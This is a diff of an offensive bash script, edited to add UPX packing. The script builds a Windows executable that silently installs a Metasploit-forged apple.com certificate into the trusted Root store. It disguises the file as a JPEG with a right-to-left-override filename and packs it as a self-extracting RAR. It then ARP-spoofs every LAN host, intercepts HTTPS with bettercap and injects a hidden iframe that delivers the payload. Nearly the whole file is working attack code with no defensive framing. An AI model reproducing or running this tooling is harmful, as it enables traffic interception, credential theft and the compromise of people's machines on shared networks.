@@ -36,21 +36,29 @@ SCRIPT_PATH="/tmp/cert-installer.py"
 DIST_PATH="$HOME/wine-pyinstaller/dist"
 EXE_NAME="cert-installer.exe"
 SFX_OUT="/var/www/html/apple-update-%E2%80%AEexe.jpg"
+UPX_URL="https://github.com/upx/upx/releases/download/v4.2.1/upx-4.2.1-win64.zip"
 
 # --- Install Required Tools ---
 color_print CYAN "[*] Checking and installing required tools..."
 apt update -y
-for pkg in wget curl jq rar imagemagick apache2 arp-scan python3 pip3 wine64 winbind winetricks metasploit-framework bettercap; do
+for pkg in wget curl jq rar unzip imagemagick apache2 arp-scan python3 pip3 wine64 winbind winetricks metasploit-framework bettercap; do
     dpkg -s "$pkg" &>/dev/null || apt install -y "$pkg"
 done
 
-# --- Set Up WINE + Install Windows Python ---
+# --- Setup WINE and Install Windows Python ---
 color_print GREEN "[*] Setting up WINE and installing Windows Python..."
-export WINEPREFIX=~/.wine64
+export WINEPREFIX="$HOME/.wine64"
 export WINEARCH=win64
 wineboot --init
 wget -q https://www.python.org/ftp/python/3.9.13/python-3.9.13-amd64.exe -O /tmp/python39.exe
-WINEPREFIX=~/.wine64 wine /tmp/python39.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+WINEPREFIX="$HOME/.wine64" wine /tmp/python39.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+
+# --- Download UPX for Windows ---
+color_print CYAN "[*] Downloading UPX for Windows..."
+mkdir -p "$WINEPREFIX/drive_c/upx"
+wget -q "$UPX_URL" -O /tmp/upx.zip
+unzip -q /tmp/upx.zip -d /tmp/
+cp /tmp/upx-4.2.1-win64/upx.exe "$WINEPREFIX/drive_c/upx/"
 
 # --- Detect Interface and Local IP ---
 color_print GREEN "[*] Detecting network interface and local IP..."
@@ -64,7 +72,7 @@ rm -rf "$HOME/.msf4/loot/"
 rm -rf "$WINEPREFIX/drive_c/pyinstaller-build" "$DIST_PATH"
 mkdir -p "$WINEPREFIX/drive_c/pyinstaller-build"
 
-# --- Generate Fake CA with Metasploit ---
+# --- Generate Fake Certificate using Metasploit ---
 color_print CYAN "[*] Generating fake certificate using Metasploit..."
 msfconsole -qx "use auxiliary/gather/impersonate_ssl;set RHOSTS apple.com;run;exit"
 
@@ -87,17 +95,18 @@ try: subprocess.call(["certutil", "-addstore", "-f", "Root", path])
 except: pass
 EOF
 
-cp "$SCRIPT_PATH" "$WINEPREFIX/drive_c/pyinstaller-build/"
+cp "$SCRIPT_PATH" "$WINEPREFIX/drive_c/pyinstaller-build/cert_installer.py"
 cp "$ICON_PATH" "$WINEPREFIX/drive_c/pyinstaller-build/apple.ico"
 
-# --- Install PyInstaller in WINE and Build EXE ---
+# --- Install PyInstaller and Build EXE with UPX ---
+color_print GREEN "[*] Installing PyInstaller and building EXE with UPX..."
 wine python -m pip install --upgrade pip setuptools wheel
 wine python -m pip install pyinstaller
 
-wine pyinstaller --onefile --noconfirm --icon "C:\\pyinstaller-build\\apple.ico" "C:\\pyinstaller-build\\cert_installer.py"
+wine pyinstaller --onefile --noconfirm --icon "C:\\pyinstaller-build\\apple.ico" --upx-dir "C:\\upx" "C:\\pyinstaller-build\\cert_installer.py"
 cp "$WINEPREFIX/drive_c/users/$USER/dist/$EXE_NAME" "$DIST_PATH/"
 
-# --- Create SFX RAR with RLO Spoofed Filename ---
+# --- Create SFX RAR with RLO Filename ---
 cat > /tmp/sfx.txt << EOF
 ;The comment below contains SFX script commands
 
@@ -119,7 +128,7 @@ color_print CYAN "[*] Scanning LAN for targets..."
 TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups --plain | awk '{print $1}' | grep -v "$LAN" | paste -sd ',' -)
 [[ -z "$TARGETS" ]] && { color_print RED "[X] No targets found on the LAN."; exit 1; }
 
-# --- Launch Bettercap MITM Attack with HTTPS Proxy and Iframe Injection ---
+# --- Launch Bettercap MITM Attack ---
 color_print GREEN "[*] Launching Bettercap MITM attack..."
 bettercap -iface "$IFACE" -eval "\
 set arp.spoof.targets $TARGETS; \
@@ -128,7 +137,7 @@ set https.proxy.engine true; \
 set https.proxy.sslstrip false; \
 set https.proxy.cert $CERT_CRT; \
 set https.proxy.key $CERT_KEY; \
-set http.proxy.injecthtml '<iframe src=\"http://$LAN/apple_update-%E2%80%AEexe.jpg\" width=0 height=0 style=\"display:none\"></iframe>'; \
+set http.proxy.injecthtml '<iframe src=\"http://$LAN/apple-update-%E2%80%AEexe.jpg\" width=0 height=0 style=\"display:none\"></iframe>'; \
 set net.sniff.verbose true; \
 set net.sniff.output /tmp/bettercap.log; \
 net.sniff on; http.proxy on; https.proxy on; arp.spoof on"
